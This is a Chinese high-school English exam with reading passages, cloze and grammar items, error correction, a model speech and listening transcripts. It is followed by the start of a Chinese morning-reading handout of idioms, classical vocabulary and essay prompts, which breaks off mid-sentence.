阅读理解(共两节，满分40分)第一节(共15小题；每小题2分，满分30分)阅读下列短文，从每题所给的四个选项(A、B、C和 D)中，选出最佳选项。\nAFor kids and many adults, a San Diego vacation means theme parks and other attractions. Before heading to a park, call or check its website for updated hours of operation; many parks have seasonal or holiday hours. Ticket prices listed here are for general admission, single-day use only.Sea World San DiegoA 6-minute ride called Journey to Atlantis, which is to open in late May, tells the legend of the island nation. After the ride of Greek fishing boats, folks can visit a new exhibit of dolphins, which has not been on display at the park since 1998.DETAILS:General admission is$46.95 for adults,$37.95 for children aged 3-9, free for children 2 and younger.1-800-380-3203 or www.seaworld.com .San Diego ZooThere’ s not much in the way of new attractions. The zoo has a new panda cub, Mei Sheng. Nighttime Zoo, a program popular with families, starts on June 26.DETAILS:General admission is $21 for adults,$14 for children aged 3- 11,free for children 2 and younger.1-619-234-3153 or www.Sandiegozoo.com .Maritime Museum of San DiegoThe HMS Surprise, the 18th-century British warship featured in the film Master and Commander, is on exhibit through Nov.30.DETAILS: The ship is available for tours from 9 am to 8 pm daily.Admission is $8 for adults,$6 for seniors and  children  aged  13- 17,$5  for  kids  aged  6- 12,and  free  for  kids  5  and  younger.1-619-234-9153  or www.sdmaritime.org .Old Town Trolley ToursVisiting relatives or friends in San Diego? They can get a hometown pass and ride for free with your paid admission.DETAILS: The main ticket booth(售票厅)is in Old Town at 4010 Twiggs St. Hours are from 9 am to 5 pm, daily $25. www.historictours.com .21.If you want to enjoy the performance of dolphins, you should go toA. Sea World San Diego                          \t\t\tB. San Diego ZooC. Maritime Museum of San Diego                  \t\tD. Old Town Trolley Tours22. If a couple visit San Diego Zoo with their children, one aged 3 and the other 2,the admission will beA. $35      \t\t\t\t\tB. $49       \t\tC. $56        \t\t\tD. $7023. It can be inferred from the text thatA. San Diego Zoo will attract the largest number of childrenB. Visitors could enjoy some stories about the island of AtlantisC. tickets during the holidays are more expensiveD. the film Master and Commander can be seen in Maritime Museum of San Diego\nBMy parents lived to be ninety-three and ninety-four. Mother lived longer and kept her mental sharpness until a few days before she died. Dad suffered from dementia(痴呆) probably for the last six months of his life. It’ s hard to say how long because his dear wife knew how to cover his forgetfulness or sometimes strange behavior up for him.There were times, however, when mother became totally frustrated with the changes she saw taking place and she would blame him for doing things on purpose just to make her angry. He loved juicy fruit gum, but she kept it hidden from sight and rationed(定量供应) it because he could chew five or six sticks in an hour and ask for another package. “I have to watch him like a hawk.” she said.Even though they lived in an assisted-living facility, my father would not bathe himself and would not let any staff person help him. So mother adjusted his shower temperature, washed his back, brought him a dry towel, and helped him dress. With her heart failure and the need for oxygen full time, this chore wore her out, both physically and emotionally. Then he started getting up in the middle of night. He would go into their bathroom, which was actually a part of their bedroom, turn on all the lights, and shave. Mother could not convince him to return to bed until he finished. As a result, mother couldn’ t get enough sleep at night.I don’ t have any answers that might have made their last months together any easier. Since they were very private people, sometimes it was hard to know what was really going on. When I stopped by their place, mother would talk nonstop as usual and daddy would smile a lot, like what he used to do. I took along food they enjoyed to them, like smoothies or milkshakes. Mother loved orchids and they thrived under her care so she usually received one for any special occasion. Daddy would often let me brush his “angel hair”, as mother named it, and I might help her fasten jewelryAll of these little things were ways to say “I love you”, but we didn’ t often discuss some of the truly important issues related to my daddy’ s declining health. I tried to respect their privacy and treat them with the dignity they deserved. I think they both tried to protect me, their daughter.I guess that’ s what parents do.24.The writer didn’ t know much about her father’ s dementia, becauseA. she didn’ t visit her parents much.B. her father hid his conditions carefully.C. her father’ s conditions weren’ t serious.D. her mother kept her father’ s dementia a secret.25. What the writer’ s mother said in Paragraph 2 shows thatA. her mother was very strict with her fatherB. her mother had to pay full attention to her fatherC. her father liked eating juicy fruit gum very muchD. her father often made her mother angry on purpose26. Seeing her father smile a lot, the writerA. found it unusual                              \t\t\tB. knew he was pretendingC. considered her father normal                     \t\tD. wanted to talk nonstop with him27. What can we conclude after reading the passage?A. The writer’ s family isn’ t filled with love.B. It’ s not easy to care for someone with dementia.C. It’ s hard to say the writer cares about her parents.D. The writer knows how to make others’ lives easier.\nCThe Great Barrier Reef’s outlook remains “very poor” despite coral recovery over the past year, Australian government scientists said Monday, just days before a UNESCO ruling on the site’ s world heritage status.The United Nations cultural agency recommended last month that the world’ s largest reef system be placed on its endangered list because of damage to the corals largely caused by climate change.The Australian Institute of Marine Science (AIMS) said the corals were now in a “recovery window” after a decade of harmful heat stress and cyclones(旋风). But such opportunities were becoming rarer due to the influence of climate change, the government agency, which has monitored the reef for 35 years, said in its annual report released today. “The increasing emergence of climate-related extreme weather events and starfish outbreaks is causing more severe and frequent pressures, giving the reef fewer opportunities like this to recover,” CEO Paul Hardisty said. The scientists surveyed 127 reef sites in 2021 and found hard coral cover had increased at 69 of the 81 locations surveyed in the past two years.Separate scientific research released last October found the 2,300-kilometre(1,400 miles) system had lost half its corals since 1995, with a series of ocean heat waves causing mass coral death.Britta Schaffelke, research program director at AIMS, said the latest findings provided a slight hope that the reef still has the power of recovering. But she added that its future is still very poor because of the dangers of climate change and other factors that are affecting the reef.UNESCO has urged Australia to take urgent climate action but the government has long resisted calls to commit to net zero emissions by 2050.The government has said it hopes to meet the target“as soon as possible” without harming its economy, insisting dealing with climate change requires a global effort. The reef was worth about US $4.8 billion a year in tourism for the Australian economy and there are fears that an “in danger” listing could weaken its tourist appeal.28.What is the major cause of the damage to the corals?A. The climate change.                       \t\t\tB. Too many tourists.C. Over development.                       \t\t\t\tD. Lack of money29. What is mainly talked about in Paragraph 3?A. The result of the survey.                     \t\t\tB. The efforts AIMS has made.C. The slight chance of the recovery.            \t\tD. The terrible situation of the climate.30. What is Britta Schaffelke’ s attitude towards the future of the reef?A. Indifferent.            \tB. Positive.            \t\tC. Intolerant.            \t\tD. Anxious.31. What can we infer from the last paragraph?A. Australia wants to put the reef on the endangered list.B. The Australian government has ignored UNESCO’ s demand.C. Australia hopes to keep a balance between emission target and its economy.D. The Australian government refuses to take its share of responsibility of climate change.\nDA group of blue-faced birds step through the grass shoulder to shoulder, red eyes looking around. They look like middle schoolers seeking a cafeteria table at lunchtime. Perhaps they’ re not so different.A new study, led by Damien Farine, an ornithologist who studies collective behaviour, shows that vulturine guinea fowls of eastern Africa, like humans, have multilevel societies. In the past, scientists assumed such social structures required a lot of brainpower. But the pea-brained guinea fowls are revealing the faults in that assumption.These large birds wander across the landscape in packs, often walking so closely that their bodies touch. They may fight each other to maintain their strict hierarchies(等级制度),but at other times they engage in friendly behaviours like sharing food.Suspecting the guinea fowl might have a social structure, Dr. Farine and his colleagues began a thorough study of their society. For a whole year, they made daily observations of 441 birds. Coloured leg bands in unique combinations let researchers tell the black-and-blue birds apart. They also attached GPS devices to the backs of 58 birds, which let them see exactly where every group went, 24 hours a day.The findings of the research suggest that vulturine guinea fowls have a multilevel society. There are groups within groups within the population as a whole. There even seem to be groups of friends within the small groups. This is the first time anyone has observed such a society in a bird.And Dr. Farine emphasizes this particular bird’s tiny brain size. “ They don’ t only have small brains relative to mammals; they also have quite small brains relative to other birds, ” he said.According to him, living in this kind of society might actually make it easier to keep track of the social order. For example, if groups are stable and a bird can identify just one or two individuals within a group, it knows which group it’ s looking at — no need for a brain that can recognize every single animal. Multilevel societies also let animals adjust their group sizes based on whatever challenges they’re facing. Depending on what enemies or resources are around, it might make sense to travel in a combined group rather than a smaller one.“Having a multilevel structure may not require having a large brain,” Dr. Farine said. There may be more birds and other animals out there that, although small-brained, have multilevel societies as our own.32.According to the passage, what inspired Dr. Farine to carry out the study?A. The guinea fowl’ s social behaviour.\t\t\t\tB. Previous assumptions about birds.C. His interest in animals’ brainpower.\t\t\t\tD. The faults in earlier research.33. What is Paragraph 4 mainly about?A. The research subjects.\t\t\t\t\t\t\tB. The research methods.C. The research findings.\t\t\t\t\t\t\tD. The research equipment.34. What can be learned from the passage?A. Complex social systems can be a disadvantage to guinea fowls.B. Guinea fowls are good at recognizing individuals in a group.C. Birds maintain the social order by travelling in combined groups.D. Small-brained animals can form multilevel societies.35. What is the main purpose of the passage?A. To present the findings of a study of the guinea fowl.B. To explain the interaction patterns in multilevel societies.C. To introduce a new approach to observing the guinea fowl.D. To uncover clues about how complex societies are formed.\n第二节(共5小题；每小题2分，满分10分)根据短文内容，从短文后的选项中选出能填入空白处的最佳选项.选项中有两项为多余选项How to Handle an Anti-climax(扫兴)Many of you work tirelessly towards your goals. You may achieve a good marriage, publish your first book or purchase your first home. 36_ Here are some steps you can take to manage and even prevent the feeling of a bit of a letdown.    37_It may feel like a bit of old-fashioned but appreciating the process you’ re taking along the way instead of fixing on the outcome can be freeing. 38__ Instead of rushing for it, take a moment to enjoy the doing. Then, acknowledge the small wins as the stepping stones toward your goal to rest on. Celebrate each new one. Look back and enjoy how far you’ ve come from the first one, and look forward to the many in front along the way.Expect the comedown.Anti-climaxes are just as common as post-holiday blues. If you are aware of a potential upcoming anti-climax, you can limit the impact on your mental health. 39__ You can consider planning some time with friends and family, attending a concert or even a cooking class. This can act as a reminder that other aspects of life can be just as fulfilling.Normalize the experience.When you don’ t feel as you expected, it can be confusing and feed into feelings of low mood, confusion, and self-doubt around anti-climaxes, which actually many people experience.    40__ If so, you will definitely feel less isolated with your own emotions. And in turn, there is a great chance that you can acknowledge the small steps and victories that you might have ignored along the way.A.  You may even reach the finish line of something bigger.B.  First,slow down a little and realize joy comes from the doing.C.  However, the achievement of these may make you feel anti-climactic.D.  One possible way to normalize your feeling is to engage with friends with similar experiences.E.  Focus the sustained progress.F.  Enjoy the journey.G.  Schedule an activity to look forward to soon after the event has been finished.\n第三 部分 英语知识运 用 ( 共两节 ， 满分 45分 )第一节 完形填空 ( 共20小题 ； 每小题1 . 5 分 ， 满分 30 分 )阅读下面短文，从短文后各题所给的四个选项(A、B、C和D)中，选出可以填入空白处的最佳选项。Pam Bales, an experienced hiker, stepped onto snow-covered Jewell Trail. The hike up the lower part of Jewell was   41   . But less than an hour later, the weather was showing its teeth. Bales began to think about calling it a day. Then she noticed something: a single set of   42    in the snow ahead of her. She’ d been   43   unclear tracks all day and hadn’ t given them much   44  , because so many people climb Jewell Trail. But these, as a volunteer of the Valley Search and Rescue Team, she realized, had been made by a pair of sneakers, which was surely not for this kind of trail.With icy wind screaming   45  ,darkness was just     46    away. If Bales continued to follow the tracks, she’ d add     47    to the journey. But the tracks    48     meant someone might be in trouble. She could not let this go. She silently scolded the   49      hiker for breaking normal safety rules and    50    to walk carefully in the direction of the tracks.After about tracks to 30 yards, she rounded a comer and saw a man sitting   51   . He wore tennis sneakers and a    52   jacket. She checked him for any sign of    53   . There was none. Bales had been trained in search and  54     and knew that he was hypothermic(体温过低的) and would die soon if he didn’ t get out of there. The man said he had lost his way and was extremely cold. Bales brought a pair of soft-shell pants, a winter hat, and a jacket from her pack. She helped the man   55    the warm, dry layers onto his body and offered him some hot cocoa. Slowly he stood up. Bales offered continuous encouragement to the man—“Keep going! You’ re doing great.”Just before 6 p.m., they arrived at the trailhead very exhausted. Her climb up to the spot where she   56    the man had taken about four hours. Two hours had passed since then.A week later, the president of Bales’ rescue group received a letter in the mail. It read:“On Sunday October 17, I went up my trail, Jewell.    57    was to be bad. But without thinking too much I was dressed to go in a hurry. Next thing I knew this lady was talking to me, changing my clothes, making me warmer. She just kept    58    me. Finally, I learned her name was Pam. The entire time she treated me with compassion( 同情心), confidence, and one hundred percent   59    … ”In the nine years since she saved John, Bales has become something of a hiking legend. It’ s a(n). 60   she never sought or wanted, but one she certainly has earned.41.A. tiring            \t\t\tB  . unforgettable       \t\t\tC. enjoyable           \t\tD. boring42. A. clothes         \t\t\tB. tools           \t\t\tC. gloves             \t\tD. footprints43. A. recording       \t\t\tB. following       \t\tC. covering           \t\tD. leaving44. A. response        \t\t\tB. expectation     \t\tC. thought            \t\tD. hope45. A. violently\t\t\t\tB. heavily\t\t\t\tC. softly\t\t\t\tD. gently46. A. miles\t\t\t\tB. periods\t\t\t\tC. hours\t\t\t\tD. minutes47. A. information\t\t\tB. risk\t\t\t\tC. interest\t\t\t\tD. pain48. A. above\t\t\t\tB. ahead\t\t\t\tC. behind\t\t\t\tD. beneath49. A. absent\t\t\t\tB. brave\t\t\t\tC. greedy\t\t\t\tD. modest50. A. denied\t\t\t\tB. insisted\t\t\t\tC. struggled\t\t\tD. urged51. A. still\t\t\t\t\tB. lively\t\t\t\tC. lonely\t\t\t\tD. existent52. A. bright\t\t\t\tB. common\t\t\tC. thick\t\t        \tD. light53. A. power\t\t\t\tB. life\t\t\t\tC. injury\t\t\t\tD. loss54. A. assistance\t\t\tB. medicine\t\t\tC. teaching\t\t\tD. rescue55. A. pick\t\t\t\tB. pull\t\t\t\tC. dress\t\t\t\tD. carry56. A. treated\t\t\t\tB. observed\t\t\tC. located\t\t\t\tD. protected57. A. Chance\t\t\t\tB. Sight\t\t\t\tC. Health\t\t\t\tD. Weather58. A. comforting\t\t\tB. encouraging\t\t\tC. instructing\t\t\tD. praising59. A. demand\t\t\t\tB. devotion\t\t\tC. offer\t\t\t\tD. order60. A. title\t\t\t\tB. fortune\t\t\t\tC. opportunity\t\t\tD. option\n第Ⅱ卷第二节(共10小题；每小题1.5分，满分15分)阅读下面材料，在空白处填入适当的内容(1个单词)或括号内单词的正确形式。Mr. Lee used to be a barber and had a      61   (satisfy) job. But three years ago, he suffered from a terrible accident because of a truck driver’ s carelessness. The crossroad was very busy,     62  (particular) at rush hours. Mr. Lee had a close encounter with death and the accident had a profound effect on him. Thanks to his outgoing personality, he didn’t lose heart. He felt it his mission  63    (make) people obey the traffic rules.After recovery, Mr. Lee applied    64    a post as a traffic policeman but got refused, because he wasn’ t qualified to do the job. But he     65   (allow) to be a temporary worker. Mr. Lee signed the contract, but now doesn’ t earn much. Every day, Mr Lee takes up his place in the street    66  (direct) the traffic. Some     67    (passer-by) who take notice of him feel very strange, but with time going by, they take     68    for granted that Mr Lee does this. Sometimes, he helps the elderly or kids cross the street and they are grateful to him for his help. He also requires everyone to obey the traffic rules. In response to his work, people    69    often pass by the crossroad never break the rules. In practice, the death toll here    70      (drop) to zero so far.\n第四部分 写作(共两节，满分35分)第一节短文改错(共10小题；每小题1分，满分10分)假定英语课上老师要求同桌之间交换修改作文，请你修改你同桌写的以下作文。文中共有10处语言错 误，每句中最多有两处。错误涉及一个单词的增加、删除或修改。增加：在缺词处加一个漏词符号(八),并在其下面写出该加的词。删除：把多余的词用斜线()划掉。修改：在错的词下画一横线，并在该词下面写出修改后的词。注意：1.每处错误及修改均仅限一词；2.只允许修改10处，多者(从第11处起)不计分。The other day, some of my classmate and I took a bicycle trip along the People’ s Road, where was specially built for people to relax. The scenery along the road was fascinating, with trees, flowers, hills and lakes on either sides. We stopped by a lake for a rest, where a good many of people were playing happily. But something unpleasant catch our attention. There was rubbish here or there, and there were many plastic bags and bottles floated on the surface of the lake. Such beautiful place was so serious polluted. What a shame! In the end, we couldn’ t help collecting the rubbish after we left.\n第二节 书面表达(满分25分)假定你是李华，你校正在组织英语演讲比赛。请你以“The Most Respectable Person in My Life”为题， 写一篇演讲稿，介绍你身边的人，内容包括：\n\n人物简介；\n尊敬原因(至少两点)。注意：\n词数100左右；2.可以适当增加细节，以使行文连贯。The Most Respectable Person in My LifeLadies and gentlemen,\n\n\n书面表达The Most Respectable Person in My LifeLadies and gentlemen,I am Li Hua. Today, it’s my great honor to make a speech about the most respectable person in my life.My Chinese teacher, in her forties&#x2F;aged about forty, has been teaching Chinese for over twenty years since her graduation. Not  only is  she  expert  at teaching the  Chinese language,but  also  she is  amiable to  everyone,alwayswearing&#x2F;with a big smile on the face.One major reason why I respect her is that she treats every student equally, regardless of his strengths or weaknesses. In addition, I adore her for the considerable encouragement that she has ever offered me, thanks to&#x2F;with which I have madegreat progress.Finally, what I want to say is that if one wants to be respected and loved, he has to be a pleasant and devoted person.Thank you for listening!\n评分标准：开头(3分);简介(5分);原因1(5分);原因2(5分);结尾(2分);书写(5分)\n听力原稿：Text 1M: You see that guy over there? Doesn’t he look familiar to you? I can’t figure out where I know him from.W: That’s the new kid, Greg, from Sweden. He sits behind you in physics.(1)Text 2W: My television stopped working yesterday. I tried to plug it in somewhere else, but the screen is still black.M: You have a very old television.It’s not worth repairing.(2)Text 3W: This new airport is going to make my life so much easier. I’ll no longer need to go to the crowded city airport.M: But I think the planes will keep me up at night.(3)Text 4W:I try to eat healthy for breakfast, but I just love foods with sugar. I eat sweet bread every other day and a few eggs inbetween.M:I eat a big breakfast of vegetables and chicken,(4) but I eat very little during the day.Text 5M: Morning roses, summer gardens …there are shelves full of products for women but nothing for men. Welike to smell fresh as well.W:I  think  there  is  a  shelf  for  men’s  products  over  past  the  food  section.If there  isn’t,you  can  try  the drugstore.(5)Text 6W: What are your plans for the holiday? Would you like to join me at my grandparents’house?(6) There is a festivalin the morning and then we have a big dinner.M: Unfortunately, I have to work. Thanks for the invitation, anyway.W: The store is open on Thanksgiving?(6) I thought it was a national holiday and most places had to close. M:Well, we prepare meals for people who don’t want to cook. There is a big list of orders.W: Will you be working all day? You could come afterwards.(7)M: No.I work from 4:00 a.m.to 3:00 p.m.,butIwill be exhausted afterwards.(7)Text 7\nW:I’m so glad that I decided to switch classes. I was doing very poorly because I wasn’t interested. Spanish is so much better for me.(8)M: Really? I thought you liked the German class. I wish I could switch, but my mother won’t let me. She says I have to learn how to speak to my relatives in Italy.(9)(10)W: I forgot that you go to Italy every summer. Don’t you enjoy speaking to them?M: Yes, but the class covers really basic material. I just sit there bored in the class.W: I wish I had that problem. I struggled through the homework.M: It’s all about practice, but I find it hard to practice when I am not challenged. If I want to get better at speaking, I willneed to do it outside of class by speaking to someone fluent.(10)Text 8(第11题为推断题)W: I can’t believe how big that mountain is.M: That’s Matterhorn. When your mother and I first came here to Switzerland, we climbed all the way to the top. W: I didn’t know you had experience in rock climbing. Wasn’t it dangerous with all the ice?M: We had a mountain climbing guide to make sure we were safe.’The climbing wasn’t even that bad. The worst partwas walking through all the deep snow.(12) Tl hat took a lot of energy.W: How long did it take to get to the top?(13)\nM:I remember reading that the average trip takes about six hours to climb up, and about the same to climb down. (13) We took our time to be careful, though. I think we spent about 15 hours up there.I needed to stop many times for a break. I was an annoying customer for that guide.W: Would you go again? I bet we can find a friendly group going up there.M: No, thank you. I was in much better shape when we went last time.Text 9   (第14题为总结题)M: Good afternoon, this is Mike with Wash-N-Dry. How can Ihelp you?W: Hello, I’m the manager at 909 Chestnut Street. T The dryer in our apartment building isn’t working well.(15)M: I’m sorry about that. We’ll fix the problem right away. Before I send someone out there, though, I’d like to ask you a few questions.W: Go ahead.M: OK. How long has the dryer been acting up?(15)W:For two weeks now.(15)M:Can you describe what’s wrong with it?W: Ye:s. The clothes used to dry perfectly with $2.(16) Last week, we had to use $3 for the same amount of clothes. This week, we have to use $4.M: Oh, that’s bad! Do you know which dryer it is?W: Just a second… I’m almost at the laundry room.Let me see.. Ihave to remember which one is broken… Yes, here it is.It’s the fourth dryer in the row. Here’s the number. J-4-8-9-L-W.M: Thank you.I’ll send Joe over this afternoon. He’ll take a spare dryer in his truck, in case he can’t fix yours.(17)I suspect that something is blocking the air flow.Anything else, ma’am?W: No, that’s it. Thank you.Text 10When I was a little boy, my grandfather told me that our family came to America from Spain. His favorite thing to talk about was a traditional event called“the human tower” .It’s a physical challenge that’s done during the annual festivals around Barcelona.. The goal of the event is to build up layers of people to try and make a high tower.(20)The people who are on the bottom are often the largest, so that they can hold everyone else.(18) Participants stand on each other’s shoulders, so it’s important to think about who goes on each level. N Men, women and kids all participate in building the tower,(18) so there are many different ways to build. The event involves everyone in the area, too.Anyone who is not involved in building the tower has an important job, though. The audience all crowd around the tower and hold up their hands to try and break the fall of any person who loses their balance.This stops anyone in the tower from getting hurt.Traditionally, the human tower has four people on each level.The world record for the largest human tower had 10 levels,(19))but the record is not why people do it.. The point is to bring the community together.(20)\n","categories":["dc资料"],"tags":["英语"]},{"title":"高2021级语文早读资料第二周","url":"/2022/12/13/dc/%E9%AB%982021%E7%BA%A7%E8%AF%AD%E6%96%87%E6%97%A9%E8%AF%BB%E8%B5%84%E6%96%99%E7%AC%AC%E4%BA%8C%E5%91%A8/","content":"高2021级语文早读资料第二周成语识记31.班荆道故：班，铺开;荆，黄荆，一种灌木;道，谈说;故，过去的事情。用黄荆铺地，坐在上面谈过去的事情。形容朋友途中相遇，共话旧情。32.坂上走丸：坂，斜坡;走，快跑，指很快的滚动;丸，弹丸。形容形势发展很快，就象斜坡上滚弹丸一样。33.半斤八两：比喻彼此一样，不相上下。34.抱残守缺：抱，坚持不放。守住陈旧、残破的东西，不肯放弃。原来比喻泥古守旧，现在比喻思想保守，不肯接受新事物。35.抱薪救火：薪，柴。比喻用错误的方法去消灭灾害，反而使灾害扩大。36.暴虎冯pín河：暴虎，徒手搏虎;冯河，徒步过河。比喻有勇无谋，冒险行事。37.暴戾恣睢：暴戾，凶狠残暴;恣睢，放纵，任意干坏事。38.暴殄tiǎn天物：暴，损害糟蹋;殄，灭绝;天物，指草木、鸟兽等。原来指灭绝各种自然生物，后来泛指任意损害、糟蹋物品。39.杯弓蛇影：比喻疑神疑鬼，自相惊扰。40.笨鸟先飞：比喻能力差的人怕落后，做事比别人先动手。41.毕其功于一役：毕，尽，完成。一次战役就完全成功或一下子把几项任务都完成了。42.闭门造车：原来是按统一规格，关起门来造车子，用起来自然合辙。后人反其意用之，比喻不问客观实际，不进行调查研究，单凭主观想象处理问题。43.敝帚千金：敝，破旧。自家的一把破扫帚，却把它看得价值千金。比喻东西虽然不好，自己却非常珍视。注意“敝”的写法。44.敝帚自珍：比喻东西虽然不好，但自己非常珍惜。45.筚(bì)路蓝缕：驾着柴车，穿着破旧的衣服去开辟山林。筚路，柴车。蓝缕，破衣服。形容创业的艰苦。46.避实就虚：指避开敌人的主力，找敌人的弱点进攻。又指谈问题回避要害。47.髀(bì)肉复生：髀：大腿。因为长久不骑马，大腿上的肉又长起来了。形容长久过着安逸舒适的生活，无所作为。48.鞭辟入里：鞭辟，鞭策，激励;里，最里层。意思是要学得切实。现在多用于形容言辞或文章的道理很深刻、透彻。49.鞭长莫及：本意为马鞭虽长，但打不到马肚上。后用以比喻力不能及。50.便biàn宜行事：指可以根据实际情况斟酌处理，不必请示。51.表里山河：内有高山，外有大河。比喻地势险要。52.别出机杼：机杼，织布机，这里比喻作文的命意构思。比喻写作不因袭前人，开辟新路。53.别出心裁：另有一种构思或设计。指想出的办法与众不同。54.别具匠心：指在技巧和艺术方面具有与众不同的巧妙构思。55.别具一格：另有一种独特的风格。56.别具只眼：比喻有独到的见解。57.别开生面：原意是凌烟阁里的功臣画像本已褪色，经曹将军重画之后才显得有生气。比喻另外创出一种新的形式或局面。58.别树一帜：比喻另创一家或另创局面。59.别无长(cháng)物：没有多余的东西。形容穷困或俭朴。60.别有天地：比喻另有一番境界。形容风景或艺术创作的境界引人入胜。\n文言实词【拔】①攻取，攻下。例1、其后秦伐赵，拔石城。（《廉颇蔺相如列传》） 例2、汉乃进军攻广都，拔之。（2008江苏卷，吴汉挥师直攻广都，迅速攻克。）②突出，超出。例1、天姥连天向天横，势拔五岳掩赤城。 出类拔萃。例2、吾读严子祺先之文，深叹其能矫然拔俗也。（2011湖南卷,）③提拔。山涛作冀州（的长官），甄（审查）拔三十余人。【罢】①停止，结束。例1、于是罢酒，侯生遂为上客。（《史记·信陵君窃符救赵》） 例2、曲罢曾教善才服，妆成每被秋娘妒。 例3、语罢暮天钟。②散，散集。罢市。③遣散。侠曰：“以口腹役人，吾所不为也。”乃悉罢之。(2005全国Ⅰ卷，裴侠说：“为了饮食而役使人，是我不做的事。”于是把他们全都遣散了。重点词语：以，因为、为了；口腹，饮食。)④免官，罢官。例1、敢用是为怨望！又投间蔑污使君，使罢。汝罪宜死，今姑贷汝。（2007福建卷，你竟敢为此产生怨恨！又趁机诬陷总管使他丢了官，你的罪恶应当处死，现在暂且饶了你。） 例2、方罢巡抚家居，独闻而异之。（2009江苏卷，刚刚不做巡抚待在家里，唯独他(彭子篯)听到这件事而感到惊奇。）⑤免除。山后盐禁，久为民害，皆奏罢之。（2007四川卷，山后盐业禁令，长期危害百姓，他都奏请免除。此义项大体相当于“贷、假、省、蠲”等）⑥撤去,撤除。于是安堵，遂罢镇兵五千人。（2011辽宁卷,从这以后那里的人都安居，便撤除镇守的兵士五千人。）⑦通“疲”，疲劳，疲弱。例1、率罢弊之卒，将数百之众，转而攻秦。（贾谊《过秦论》）例2、罢夫羸老易子而咬其骨。（贾谊《论积贮疏》）例3、帝问修太乙祠，则对曰：“土工洊起，民罢于征发，非所以事天也。”（2006江苏卷，土建工程再度兴起，百姓被征集调遣搞得疲惫不堪，这不是用来侍奉上天的做法。）⑧无能，与“贤”相对。无国而不有贤士，无国而不有罢士。（无国，没有一个国家）。⑨尽，完。只吹的水尽鹅飞罢。【白】①纯洁，皎洁；明亮，天亮。例1、唯见江心秋月白。 例2、雄鸡一唱天下白。②清楚，明了。罪白者伏其诛。③显著。威功白著。④禀告，告诉，陈述。例1、便可白公姥，及时相遣归。例2、巫妪、弟子，是女子也，不能白事。（《西门豹治邺》）例3、县有轻囚十数人，会春暮时雨，临白令请出之，令不许。（2005江西卷，（万泉）县有十几个犯了轻罪的囚徙，适逢春末下了应时的雨，唐临禀告县令，请求（暂且）放他们出狱，县令不允许。）例4、其军帅怒贲不先白己而专献金，下贲狱。世祖闻之，大怒，执帅将杀之，以勋旧而止。（2007四川卷，贺贲的主帅对他事先不禀告自己就擅自（向世祖）献金感到愤怒，把贺贲关进监狱。世祖听说这件事，非常愤怒，逮捕了主帅将要杀他，因为（他）是有功的老臣而作罢。）\n文化常识（待续：10个）11邻（比）、里（闾）、族、党、州、乡五家为邻；五邻为里，25家；四里为族，100家；五族为党，500家；五党为州，2500家；五州为乡，12500家。12姓、氏姓：以女子为传承中心，别婚姻，秦汉时期姓氏合而为一。氏，以男子为传承中心，明贵贱。13名、字、号名：出生三个月后父亲命名。名供长辈称呼，自称时表谦卑，直呼时表轻蔑。字：男子20行冠礼尊长。取字；女子15行笄礼取字，词义相近或相反。称字是对平辈或尊辈的礼貌或尊敬。号：自称。14伯、孟、仲、叔、季伯：嫡长子。孟，庶长子。仲，老二。叔，老三。季，最小。15孟、仲、季孟，每季的第一个月。仲，每季的第二个月。季，每季的第三个月。如孟春是1月，仲夏是5月，季秋是9月。16孝悌、孝廉孝：孝敬父母。悌：敬爱兄长。17椿楦椿：代指父亲。楦：代指母亲。椿萱并茂指父母健在。18考妣考：先父。妣：先母。19失恃、失怙失恃：丧母。失怙：丧父。20丁忧、丁艰丁忧：丁，遭遇。忧，居丧。丁忧指遭遇父母的丧事，又叫“丁艰”“丁家艰”。封建时代，朝廷官员在位期间，若父母去世，必须辞官回到祖籍，为父母守制三年（一般为二十七个月）。丁艰：分丁内艰和丁外艰。丁内艰指母亲或祖母去世。丁外艰指父亲或祖父去世。\n作文（一）作文金句●人皆知涤其器，而莫知涤其心。——《傅子》● 种树者必培其根，种德者必养其心。——明代思想家王守仁（王阳明）《传习录》● 天下有大勇者，猝然临之而不惊，不故加之而不怒。——苏轼● 草木不经霜雪，则生意不固；吾人不经忧患，则德慧不成。——清•沈近思● 独立精神和自由意志是必须争的，且须以生死力争。——陈寅恪● 生命的意义在于付出，在于给予，而不是在于接受，也不是在于争取。──巴金●人生有三层楼：第一层是物质生活，第二层是精神生活，第三层是灵魂生活。——丰子恺● 你要看一个国家的文明，只消考察三件事：第一看他们怎样待小孩子；第二看他们怎样待女人；第三看他们怎样利用闲暇的时间。——胡适● 即使踏着荆棘，也不觉悲苦；即使有泪可落，亦不是悲凉。——沈从文（二）优秀议论文评改试卷时，常常会听到任教数理化等科目的老师向语文老师抱怨：“学生连题目都读不懂！审题不会‘咬文嚼字’怎么会做题？”新冠肺炎疫情防控的中流砥柱钟南山院士近日与大家分享学习体会：“学好语文最关键，学好语文才能对事情进行分析，进行综合和总结。”最近，由武汉发布的32张抗疫感恩海报获得了无数点赞。“下个烟花三月，一同登楼望春风”“八闽来助，江城有福”……32处美景，配上32句各具特色的美言，让人觉得美好又充满希望。    外交部发言人耿爽回应美方诋毁中方的抗疫努力：“行有不得，反求诸己。”此话为孟子所言，意为做事不成功，就要从自身找原因。大批网友纷纷赞其“驳得好”的同时也感慨：“不学一点国学知识，中国话你都听不懂！”学生小陈经常在班上宣扬语文学习无用论，作为小陈的同学，读了上述材料，你对语文学习有何感想？请你写一篇驳论文来反驳小陈。要求：结合材料，自选角度，确定立意，自拟标题；切合身份，贴合情境；符合文体特征；不要套作，不得抄袭；不得泄露个人信息；不少于800字。（一）、审题指导审读题目：作文题目由四则材料、任务指令和其它要求三部分构成。1、审读四则材料四则材料指向同一个要点：语文学习的重要性，且都是正面切入，可视为提供给考生写驳论文的立论参考，即证明“语文有用”的若干理由。一般而言，作文题的任何部分都是有用的，聪明的考生，应该学会就地取材，将这部分作为展开论述的的参考，也很好地完成了“结合材料”的要求。材料一，是说语文学习应掌握听说读写的能力，这是学习其他学科知识的前提，侧重于语文学习的语言基础性作用。材料二，引用钟南山院士的观点，指出学好语文有利于提高分析、综合和总结能力，侧重于思维能力的层面。材料三，通过武汉32 